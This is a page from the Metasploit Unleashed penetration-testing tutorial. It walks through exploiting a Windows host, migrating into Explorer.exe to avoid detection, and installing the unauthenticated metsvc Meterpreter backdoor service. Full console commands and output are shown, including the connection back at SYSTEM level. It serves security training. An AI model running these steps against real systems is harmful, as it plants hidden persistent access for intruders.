
		<!DOCTYPE html>
		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
		<head>
			<title>Meterpreter Backdoor - Metasploit Unleashed</title>
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
			<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
		</head>

		<body>
			<div id="wrapper">
			
				<div id="header">
					<div id="header-content">
						<h1><a style="color:#F0F0F0" href="index.html">Metasploit Unleashed</a></h1>
						<div class="tagline">Mastering the Framework</div>
						<div class="clear"></div>
					</div>
				</div>
				
				<div id="page">
					<div id="right-box">
						
						<div id="controls">
									<ul>
			<li id="ca-nstab-main" class="selected"><a href="Meterpreter_Backdoor" title="View the content page [c]" accesskey="c">Page</a></li>
			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Meterpreter_Backdoor&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Backdoor&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Backdoor&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
		</ul>
							
							<div class="portlet" id="p-personal">
								<div class="pBody">
								<ul>
																	</ul>
								</div>
							</div>
							
							<div class="search">
									<div id="p-search" class="portlet">
		<div id="searchBody" class="pBody">
			<form action="http://www.offensive-security.com/w/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input type="search" name="search" title="Search Metasploit Unleashed [f]" accesskey="f" id="searchInput" />
				<input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchGoButton" class="searchButton" />&#160;
				<input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton" />
			</form>
		</div>
	</div>
							</div>
							
							<div class="clear"></div>
						</div>
					
						<a id="top"></a>
						
						<div id="content">
							<h1>Meterpreter Backdoor</h1>
						
							<div id="siteSub">From Metasploit Unleashed</div>
							<div id="contentSub"></div>
																													<div id="jump-to-nav">Jump to: <a href="Meterpreter_Backdoor#column-one">navigation</a>, <a href="Meterpreter_Backdoor#searchInput">search</a></div>
														<!-- start content -->
							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p><br />
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="Meterpreter_Backdoor#Meterpreter_Backdoor"><span class="tocnumber">1</span> <span class="toctext">Meterpreter Backdoor</span></a></li>
<li class="toclevel-1 tocsection-2"><a href="Meterpreter_Backdoor#Interacting_with_Metsvc"><span class="tocnumber">2</span> <span class="toctext">Interacting with Metsvc</span></a></li>
</ul>
</td></tr></table>
<p><br />
</p>
<h2> <span class="mw-headline" id="Meterpreter_Backdoor"> Meterpreter Backdoor </span></h2>
<p>After going through all the hard work of exploiting a system, it's often a good idea to leave yourself an easier way back into the system later. This way, if the service you exploited is down or patched, you can still gain access to the system. To read about the original implementation of metsvc, go to <a rel="nofollow" class="external free" href="http://www.phreedom.org/software/metsvc/">http://www.phreedom.org/software/metsvc/</a>.
<br />
<br />
Using the metsvc backdoor, you can gain a Meterpreter shell at any point.
<br />
<br />
One word of warning here before we go any further. Metsvc as shown here requires no authentication. This means that anyone that gains access to the port could access your back door! This is not a good thing if you are conducting a penetration test, as this could be a significant risk. In a real world situation, you would either alter the source to require authentication, or filter out remote connections to the port through some other method.
<br />
<br />
First, we exploit the remote system and migrate to the 'Explorer.exe' process in case the user notices the exploited service is not responding and decides to kill it.
<br />
<br />
<pre>msf exploit(<span style='color:#ff0000;'>3proxy</span>) > <span style='color:#13C16A;'>exploit</span>

<span style='color:#0000FF;'>[*]</span> Started reverse handler
<span style='color:#0000FF;'>[*]</span> Trying target Windows XP SP2 - English...
<span style='color:#0000FF;'>[*]</span> Sending stage (719360 bytes)
<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.104:1983)

<u>meterpreter</u> > <span style='color:#13C16A;'>ps</span>

Process list
============

    PID   Name                 Path
    ---   ----                 ----
    132   ctfmon.exe           C:\WINDOWS\system32\ctfmon.exe
    176   svchost.exe          C:\WINDOWS\system32\svchost.exe
    440   VMwareService.exe    C:\Program Files\VMware\VMware Tools\VMwareService.exe
    632   Explorer.EXE         C:\WINDOWS\Explorer.EXE
    796   smss.exe             \SystemRoot\System32\smss.exe
    836   VMwareTray.exe       C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    844   VMwareUser.exe       C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    884   csrss.exe            \??\C:\WINDOWS\system32\csrss.exe
    908   winlogon.exe         \??\C:\WINDOWS\system32\winlogon.exe
    952   services.exe         C:\WINDOWS\system32\services.exe
    964   lsass.exe            C:\WINDOWS\system32\lsass.exe
    1120  vmacthlp.exe         C:\Program Files\VMware\VMware Tools\vmacthlp.exe
    1136  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1236  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1560  alg.exe              C:\WINDOWS\System32\alg.exe
    1568  WZCSLDR2.exe         C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
    1596  jusched.exe          C:\Program Files\Java\jre6\bin\jusched.exe
    1656  msmsgs.exe           C:\Program Files\Messenger\msmsgs.exe
    1748  spoolsv.exe          C:\WINDOWS\system32\spoolsv.exe
    1928  jqs.exe              C:\Program Files\Java\jre6\bin\jqs.exe
    2028  snmp.exe             C:\WINDOWS\System32\snmp.exe
    2840  3proxy.exe           C:\3proxy\bin\3proxy.exe
    3000  mmc.exe              C:\WINDOWS\system32\mmc.exe

<u>meterpreter</u> > <span style='color:#13C16A;'>migrate 632</span>
<span style='color:#0000FF;'>[*]</span> Migrating to 632...
<span style='color:#0000FF;'>[*]</span> Migration completed successfully.</pre>
<br />
Before installing metsvc, let's see what options are available to us.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run metsvc -h</span>
<span style='color:#0000FF;'>[*]</span>
OPTIONS:

    -A        Automatically start a matching multi/handler to connect to the service
    -h        This help menu
    -r        Uninstall an existing Meterpreter service (files must be deleted manually)

<u>meterpreter</u> ></pre>
<br />
Since we're already connected via a Meterpreter session, we won't set it to connect back to us right away.  We'll just install the service for now.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run metsvc</span>
<span style='color:#0000FF;'>[*]</span> Creating a meterpreter service on port 31337
<span style='color:#0000FF;'>[*]</span> Creating a temporary installation directory C:\DOCUME~1\victim\LOCALS~1\Temp\JplTpVnksh...
<span style='color:#0000FF;'>[*]</span>  >> Uploading metsrv.dll...
<span style='color:#0000FF;'>[*]</span>  >> Uploading metsvc-server.exe...
<span style='color:#0000FF;'>[*]</span>  >> Uploading metsvc.exe...
<span style='color:#0000FF;'>[*]</span> Starting the service...
<span style='color:#0000FF;'>[*]</span>      * Installing service metsvc
 * Starting service
Service metsvc successfully installed.

<u>meterpreter</u> ></pre>
<br />
The service is now installed and waiting for a connection.
<br />
</p><p><br />
</p>
<h2> <span class="mw-headline" id="Interacting_with_Metsvc"> Interacting with Metsvc </span></h2>
<p>We will now use the multi/handler with a payload of 'windows/metsvc_bind_tcp' to connect to the remote system. This is a special payload, as typically a Meterpreter payload is multistage, where a minimal amount of code is sent as part of the exploit, and then more is uploaded after code execution has been accomplished.
<br />
<br />
Think of a shuttle rocket, and the booster rockets that are utilized to get the space shuttle into orbit. This is much the same, except instead of extra items being there and then dropping off, Meterpreter starts as small as possible, then adds on. In this case however, the full Meterpreter code has already been uploaded to the remote machine, and there is no need for a staged connection.
<br />
<br />
We set all of our options for 'metsvc_bind_tcp' with the victim's IP address and the port we wish to have the service connect to on our machine.  We then run the exploit.
<br />
<br />
<pre>msf > <span style='color:#13C16A;'>use exploit/multi/handler</span>
msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/metsvc_bind_tcp</span>
PAYLOAD => windows/metsvc_bind_tcp
msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set LPORT 31337</span>
LPORT => 31337
msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set RHOST 192.168.1.104</span>
RHOST => 192.168.1.104
msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>show options</span>

Module options:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/metsvc_bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LPORT     31337            yes       The local port
   RHOST     192.168.1.104    no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>exploit</span></pre>
<br />
Immediately after issuing 'exploit', our metsvc backdoor connects back to us.
<br />
<br />
<pre><span style='color:#0000FF;'>[*]</span> Starting the payload handler...
<span style='color:#0000FF;'>[*]</span> Started bind handler
<span style='color:#0000FF;'>[*]</span> Meterpreter session 2 opened (192.168.1.101:60840 -> 192.168.1.104:31337)

<u>meterpreter</u> > <span style='color:#13C16A;'>ps</span>

Process list
============

   PID   Name               Path                                                  
   ---   ----               ----                                                  
   140   smss.exe           \SystemRoot\System32\smss.exe                         
   168   csrss.exe          \??\C:\WINNT\system32\csrss.exe                       
   188   winlogon.exe       \??\C:WINNT\system32\winlogon.exe                    
   216   services.exe       C:\WINNT\system32\services.exe                        
   228   lsass.exe          C:\WINNT\system32\lsass.exe                           
   380   svchost.exe        C:\WINNT\system32\svchost.exe                         
   408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                         
   444   svchost.exe        C:\WINNT\System32\svchost.exe                         
   480   regsvc.exe         C:\WINNT\system32\regsvc.exe                          
   500   MSTask.exe         C:\WINNT\system32\MSTask.exe                          
   528   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe
   564   metsvc.exe         c:\WINNT\my\metsvc.exe                                
   588   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe                    
   676   cmd.exe            C:\WINNT\System32\cmd.exe                             
   724   cmd.exe            C:\WINNT\System32\cmd.exe                             
   764   mmc.exe            C:\WINNT\system32\mmc.exe                             
   816   metsvc-server.exe  c:\WINNT\my\metsvc-server.exe                         
   888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe   
   896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe   
   940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe          
   972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
   1000  Explorer.exe       C:\WINNT\Explorer.exe                                 
   1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe

<u>meterpreter</u> > <span style='color:#13C16A;'>pwd</span>
C:\WINDOWS\system32
<u>meterpreter</u> > <span style='color:#13C16A;'>getuid</span>
Server username: NT AUTHORITY\SYSTEM
<u>meterpreter</u> ></pre>
<br />
And here we have a typical Meterpreter session! Again, be careful with when and how you use this trick. System owners will not be happy if you make an attackers job easier for them by placing such a useful backdoor on the system for them.
<br />
<br />
</p>
<hr />
<p><br />




























</p>
<div class="Total1"><a href="Maintaining_Access" title="Maintaining Access">Maintaining Access</a> &gt; Meterpreter Backdoor</div>
<p>










































</p>
<div class="Total2"><a href="Keylogging" title="Keylogging">Keylogging</a> &#124; <a href="Persistent_Meterpreter_Service" title="Persistent Meterpreter Service">Persistent Meterpreter Service</a> &#124; <strong class="selflink">Meterpreter Backdoor</strong></div>
<p>








































</p>
<div class="Total3"><a href="Interacting_With_Metsvc" title="Interacting With Metsvc">Interacting With Metsvc</a></div>
<p>















</p>
<!-- 
NewPP limit report
Preprocessor visited node count: 555/1000000
Preprocessor generated node count: 2735/1000000
Postâ€expand include size: 4174/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 3/40
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:79-0!*!0!!en!*!* and timestamp 20131123222542 -->
</div><div class="printfooter">
Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Backdoor&amp;oldid=1510">http://www.offensive-security.com/w/index.php?title=Meterpreter_Backdoor&amp;oldid=1510</a>"</div>
							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Maintaining_Access&amp;action=edit&amp;redlink=1" class="new" title="Category:Maintaining Access (page does not exist)">Maintaining Access</a></li></ul></div></div>							<!-- end content -->
													</div>
						
					</div>
				
					<div id="left-box">
								<ul id="nav">
				<li><a href="Donate" class="root">Donate</a></li>
				<li>
					<a href="Introduction" class="root"><span class="chapter">01</span> Introduction</a>
					<div class="menu two-column">
						<h3>Introduction</h3>
						<ul class="one">
							<li><a href="Metasploit_Architecture">Metasploit Architecture</a>
								<ul class="two small">
									<li><a href="Filesystem_And_Libraries">Filesystem And Libraries</a></li>
									<li><a href="Modules_And_Locations">Modules And Locations</a></li>
									<li><a href="Metasploit_Object_Model">Metasploit Object Model</a></li>
									<li><a href="Mixins_And_Plugins">Mixins And Plugins</a></li>
								</ul>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
					<a href="Requirements" class="root"><span class="chapter">02</span> Requirements</a>
					<div class="menu two-column">
						<h3>Required Materials</h3>
						<ul class="one">
							<li><a href="Metasploitable">Metasploitable</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Metasploit_Fundamentals" class="root"><span class="chapter">03</span>Metasploit Fundamentals</a>
					<div class="menu four-column">
						<h3>Metasploit Fundamentals</h3>
						<ul class="one">
							<li><a href="Msfcli">Msfcli</a></li>
							<li><a href="Msfconsole">Msfconsole</a>
								<ul class="two small">
									<li><a href="Msfconsole_Commands">Msfconsole Commands</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Exploits">Exploits</a>
								<ul class="two">
									<li><a href="Using_Exploits">Using Exploits</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Payloads">Payloads</a>
								<ul class="two small">
									<li><a href="Payload_Types">Payload Types</a></li>
									<li><a href="Generating_Payloads">Generating Payloads</a></li>
								</ul>
								<div class="clear"></div>
							</li>
                                                        <li><a href="Databases">Databases</a>
                                                                <ul class="two small">
                                                                        <li><a href="Using_the_Database">Using the Database</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
							<li><a href="About_Meterpreter">About Meterpreter</a>
								<ul class="two">
									<li><a href="Meterpreter_Basics">Meterpreter Basics</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
				<a href="Information_Gathering" class="root"><span class="chapter">04</span> Information Gathering</a>
					<div class="menu two-column">
						<h3>Information Gathering</h3>
						<ul class="one">
							<li><a href="Port_Scanning">Port Scanning</a></li>
							<li><a href="Hunting_For_MSSQL">Hunting For MSSQL</a></li>
							<li><a href="Service_Identification">Service Identification</a></li>
							<li><a href="Password_Sniffing">Password Sniffing</a>
								<ul class="two">
									<li><a href="Extending_Psnuffle">Extending Psnuffle</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="SNMP_Sweeping">SNMP Sweeping</a></li>
							<li><a href="Writing_Your_Own_Scanner">Writing Your Own Scanner</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Vulnerability_Scanning" class="root"><span class="chapter">05</span> Vulnerability Scanning</a>
					<div class="menu two-column">
						<h3>Vulnerability Scanning</h3>
						<ul class="one">
							<li><a href="SMB_Login_Check">SMB Login Check</a></li>
							<li><a href="VNC_Authentication">VNC Authentication</a></li>
							<li><a href="WMAP_Web_Scanner">WMAP Web Scanner</a></li>
							<li><a href="Working_With_NeXpose">Working With NeXpose</a>
		     		                                <ul class="two small">
                                                                        <li><a href="NeXpose_Via_Msfconsole">NeXpose Via Msfconsole</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							</li>
                                                        <li><a href="Working_With_Nessus">Working With Nessus</a>
								<ul class="two small">
									<li><a href="Nessus_Via_Msfconsole">Nessus Via Msfconsole</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Writing_A_Simple_Fuzzer" class="root"><span class="chapter">06</span> Writing A Simple Fuzzer</a>
					<div class="menu two-column">
						<h3>Writing a Simple Fuzzer</h3>
						<ul class="one">
							<li><a href="Simple_TFTP_Fuzzer">Simple TFTP Fuzzer</a></li>
							<li><a href="Simple_IMAP_Fuzzer">Simple IMAP Fuzzer</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Exploit_Development" class="root"><span class="chapter">07</span> Exploit Development</a>
					<div class="menu two-column">
						<h3>Exploit Development</h3>
						<ul class="one">
							<li><a href="Exploit_Design_Goals">Exploit Design Goals</a></li>
							<li><a href="Exploit_Format">Exploit Format</a></li>
							<li><a href="Exploit_Mixins">Exploit Mixins</a></li>
							<li><a href="Exploit_Targets">Exploit Targets</a></li>
							<li><a href="Exploit_Payloads">Exploit Payloads</a>
								<ul class="two small">
									<li><a href="Msfvenom">Msfvenom</a></li>
									<li><a href="Msfpayload">Msfpayload</a></li>
									<li><a href="Msfencode">Msfencode</a></li>
									<li><a href="Alphanumeric_Shellcode">Alphanumeric Shellcode</a></li>
									<li><a href="Msfrop">Msfrop</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Writing_An_Exploit">Writing An Exploit</a>
								<ul class="two small">
									<li><a href="Getting_A_Shell">Getting A Shell</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Using_The_Egghunter_Mixin">Using The Egghunter Mixin</a>
								<ul class="two small">
									<li><a href="Completing_The_Exploit">Completing The Exploit</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Porting_Exploits">Porting Exploits</a></li>
						</ul>
					</div>
				</li>
                                <li>
                                        <a href="Web_App_Exploit_Dev" class="root"><span class="chapter">08</span> Web App Exploit Dev</a>
                                        <div class="menu two-column">
                                                <h3>Client-side Exploits</h3>
                                                <ul class="one">
                                                        <li><a href="Installing_dotDefender">Installing dotDefender</a></li>
                                                        <li><a href="Analyzing_the_Exploit">Analyzing the Exploit</a></li>
                                                        <li><a href="Skeleton_Creation">Skeleton Creation</a></li>
                                                        <li><a href="Making_A_Log_Entry">Making A Log Entry</a></li>
                                                        <li><a href="Hosting_the_Javascript">Hosting the Javascript</a></li>
                                                        <li><a href="Final_Exploit">Final Exploit</a></li>
                                                </ul>
                                        </div>
                                </li>
				<li>
					<a href="Client_Side_Attacks" class="root"><span class="chapter">09</span> Client Side Attacks</a>
					<div class="menu three-column">
						<h3>Client Side Attacks</h3>
						<ul class="one">
							<li><a href="Binary_Payloads">Binary Payloads</a></li>
							<ul class="two small">
								<li><a href="Binary_Linux_Trojan">Binary Linux Trojan</a></li>
							</ul>
							<div class="clear"></div>
							<li><a href="Client_Side_Exploits">Client Side Exploits</a></li>
							<li><a href="VBScript_Infection_Methods">VBScript Infection Methods</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Post_Exploitation" class="root"><span class="chapter">10</span> MSF Post Exploitation</a>
					<div class="menu two-column">
						<h3>MSF Post Exploitation</h3>
						<ul class="one">
							<li><a href="Privilege_Escalation">Privilege Escalation</a></li>
							<li><a href="PSExec_Pass_The_Hash">PSExec Pass the Hash</a></li>
							<li><a href="Event_Log_Management">Event Log Management</a></li>
							<li><a href="Fun_With_Incognito">Fun with Incognito</a></li>
							<li><a href="Interacting_With_The_Registry">Interacting with the Registry</a>
								<ul class="two small">
									<li><a href="Persistent_Netcat_Backdoor">Persistent Netcat Backdoor</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Enabling_Remote_Desktop">Enabling Remote Desktop</a></li>
							<li><a href="Packet_Sniffing">Packet Sniffing</a></li>
							<li><a href="Pivoting">Pivoting</a></li>
                                                                <ul class="two small">
                                                                        <li><a href="Portfwd">Portfwd</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							<li><a href="TimeStomp">TimeStomp</a></li>
							<li><a href="Screen_Capture">Screen Capture</a></li>
							<li><a href="Searching_For_Content">Searching For Content</a></li>
							<li><a href="John_The_Ripper">John The Ripper</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Meterpreter_Scripting" class="root"><span class="chapter">11</span> Meterpreter Scripting</a>
					<div class="menu two-column">
						<h3>Meterpreter Scripting</h3>
						<ul class="one">
							<li><a href="Existing_Scripts">Existing Scripts</a></li>
							<li><a href="Writing_Meterpreter_Scripts">Writing Meterpreter Scripts</a></li>
							<li><a href="Custom_Scripting">Custom Scripting</a></li>
							<li><a href="Useful_API_Calls">Useful API Calls</a></li>
							<li><a href="Useful_Functions">Useful Functions</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Maintaining_Access" class="root"><span class="chapter">12</span> Maintaining Access</a>
					<div class="menu two-column">
						<h3>Maintaining Access</h3>
						<ul class="one">
							<li><a href="Keylogging">Keylogging</a></li>
							<li><a href="Meterpreter_Backdoor">Meterpreter Backdoor</a></li>
							<li><a href="Persistent_Backdoors">Persistent Backdoors</a></li>
						        <ul class="two small">
								 <li><a href="Netcat_Backdoor">Netcat Backdoor</a></li>
		 						 <li><a href="Meterpreter_Service">Meterpreter Service</a></li>
							</ul>
								 <div class="clear"></div>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Extended_Usage" class="root"><span class="chapter">13</span> MSF Extended Usage</a>
					<div class="menu two-column">
						<h3>MSF Extended Usage</h3>
						<ul class="one">
							<li><a href="PHP_Meterpreter">PHP Meterpreter</a></li>
							<li><a href="Backdooring_EXE_Files">Backdooring EXE Files</a></li>
							<li><a href="Karmetasploit">Karmetasploit</a>
								<ul class="two small">
									<li><a href="Karmetasploit_Configuration">Configuration</a></li>
									<li><a href="Karmetasploit_In_Action">Karmetasploit in Action</a></li>
									<li><a href="Attack_Analysis">Attack Analysis</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="MSF_vs_OS_X">MSF vs OS X</a></li>
							<li><a href="File-Upload_Backdoors">File-Upload Backdoors</a></li>
							<li><a href="Building_A_Module">Building A Module</a>
								<ul class="two small">
									<li><a href="Payloads_Through_MSSQL">Payloads Through MSSQL</a></li>
									<li><a href="Creating_Our_Auxiliary_Module">Creating Our Auxiliary Module</a></li>
									<li><a href="The_Guts_Behind_It">The Guts Behind It</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
                                        <a href="Metasploit_GUIs" class="root"><span class="chapter">14</span> Metasploit GUIs</a>
					<div class="menu two-column">
						<h3>Metasploit GUIs</h3>
						<ul class="one">
							<li><a href="MSF_Community_Edition">MSF Community Edition</a>
								<ul class="two small">
                                                                        <li><a href="Scanning">Scanning</a></li>
                                                                        <li><a href="Exploitation">Exploitation</a></li>
                                                                        <li><a href="Post_Exploitation">Post Exploitation</a></li>
                                                                </ul>
								<div class="clear"></div>
                                                        </li>
							<li><a href="Armitage">Armitage</a>
                                                                <ul class="two small">
                                                                        <li><a href="Armitage_Setup">Armitage Setup</a></li>
                                                                        <li><a href="Armitage_Scanning">Armitage Scanning</a></li>
                                                                        <li><a href="Armitage_Exploitation">Armitage Exploitation</a></li>
                                                                	<li><a href="Armitage_Post_Exploitation">Armitage Post Exploitation</a></li>
								</ul>
							</li>
						</ul>
					</div>
				</li>
				<li><a href="About_The_Authors" class="root">About The Authors</a>
					<div class="menu two-column">
						<h3>About the Authors</h3>
						<ul class="one">
							<li><a href="Mati_Aharoni">Mati Aharoni</a></li>
							<li><a href="William_Coppola">William Coppola</a></li>
							<li><a href="Paul_Hand">Paul Hand</a></li>
							<li><a href="Alain_Hernandez">Alain Hernandez</a></li>
							<li><a href="Devon_Kearns">Devon Kearns</a></li>
							<li><a href="David_Kennedy">David Kennedy</a></li>
							<li><a href="Steven_McElrea">Steven McElrea</a></li>
							<li><a href="Matteo_Memelli">Matteo Memelli</a></li>
							<li><a href="http://www.offensive-security.com/metasploit-unleashed/Jim_O'Gorman">Jim O'Gorman</a></li>
							<li><a href="David_Ovitz">David Ovitz</a></li>
							<li><a href="Carlos_Perez">Carlos Perez</a></li>
						</ul>
					</div>
				</li>
                                <li><a href="Post_Module_Reference" class="root">Post Module Reference</a>    
                                        <div class="menu three-column">
                                                <h3>Post Module Reference</h3>
                                                <ul class="one">
                                                        <li>Windows   
                                                                <ul class="two">
                                                                        <li><a href="Windows_Post_Capture_Modules">Capture</a></li>
                                                                        <li><a href="Windows_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Windows_Post_Manage_Modules">Manage</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Linux
                                                                <ul class="two">
                                                                        <li><a href="Linux_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>OS X
                                                                <ul class="two">
                                                                        <li><a href="OS_X_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                        <li>Multiple OS
                                                                <ul class="two">
                                                                        <li><a href="Multiple_OS_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Multiple_OS_Post_General_Modules">General</a></li>
                                                                </ul>
							                                	<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
                                <li><a href="Auxiliary_Module_Reference" class="root">Auxiliary Module Reference</a>    
                                        <div class="menu four-column">
                                                <h3>Auxiliary Module Reference</h3>
                                                <ul class="one">
                                                        <li>Admin   
                                                                <ul class="two">
                                                                        <li><a href="Admin_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Admin_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Admin_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Admin_Postgres_Auxiliary_Modules">Postgres</a></li>
                                                                        <li><a href="Admin_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Scanner
                                                                <ul class="two">
                                                                        <li><a href="Scanner_DCERPC_Auxiliary_Modules">DCERPC</a></li>
                                                                        <li><a href="Scanner_Discovery_Auxiliary_Modules">Discovery</a></li>
                                                                        <li><a href="Scanner_FTP_Auxiliary_Modules">FTP</a></li>
                                                                        <li><a href="Scanner_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Scanner_IMAP_Auxiliary_Modules">IMAP</a></li>
                                                                        <li><a href="Scanner_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Scanner_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Scanner_NetBIOS_Auxiliary_Modules">NetBIOS</a></li>
                                                                        <li><a href="Scanner_POP3_Auxiliary_Modules">POP3</a></li>
                                                                        <li><a href="Scanner_SMB_Auxiliary_Modules">SMB</a></li>
                                                                        <li><a href="Scanner_SMTP_Auxiliary_Modules">SMTP</a></li>
                                                                        <li><a href="Scanner_SNMP_Auxiliary_Modules">SNMP</a></li>
                                                                        <li><a href="Scanner_SSH_Auxiliary_Modules">SSH</a></li>
                                                                        <li><a href="Scanner_Telnet_Auxiliary_Modules">Telnet</a></li>
                                                                        <li><a href="Scanner_TFTP_Auxiliary_Modules">TFTP</a></li>
                                                                        <li><a href="Scanner_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                        <li><a href="Scanner_VNC_Auxiliary_Modules">VNC</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>Server
                                                                <ul class="two">
                                                                        <li><a href="Server_Capture_Auxiliary_Modules">Capture</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
			<br />
			<br />
			<br />
			<br />
			</ul>
													</div>
				
					<div class="clear"></div>
				</div>

				<div id="footer">
					<div id="footer-content">
						<div class="left">
							Copyright &copy; 2013 Offensive Security Ltd. All rights reserved.
						</div>
						<div class="right">
							<a href="http://www.offensive-security.com/"><img src="http://www.offensive-security.com/w/skins/msfu/offsec.png" alt="Offensive Security" /></a>
						</div>
						<div class="clear"></div>
					</div>
				</div>
			
		</div>
<script>if(window.mw){
mw.loader.state({"site":"loading","user":"missing","user.groups":"ready"});
}</script>
<script>if(window.mw){
mw.loader.load(["mediawiki.user","mediawiki.page.ready","mediawiki.searchSuggest"], null, true);
}</script>
<script src="http://www.offensive-security.com/w/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=msfu&amp;*"></script>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-1981501-1");
pageTracker._trackPageview();
</script><!-- Served in 0.123 secs. --></body></html>